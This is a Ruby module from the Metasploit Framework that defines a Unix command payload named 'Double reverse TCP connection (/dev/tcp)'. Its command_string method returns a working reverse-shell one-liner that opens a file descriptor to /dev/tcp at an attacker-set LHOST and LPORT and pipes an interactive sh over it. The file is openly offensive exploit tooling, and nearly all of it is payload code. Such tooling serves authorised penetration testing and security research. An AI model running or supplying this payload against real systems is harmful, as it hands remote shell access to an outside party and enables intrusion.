require 'msf/core'
require 'msf/core/handler/reverse_tcp_double'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Cmd
module Unix

module ReverseBash

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command, Double reverse TCP connection (/dev/tcp)',
			'Version'       => '$Revision$',
			'Description'   => 'Creates an interactive shell through two inbound connections',
			'Author'        => 'hdm',
			'License'       => MSF_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::ReverseTcpDouble,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd_bash',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string
		return "exec 13<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};sh <&13 >&13";
	end

end

end end end end end
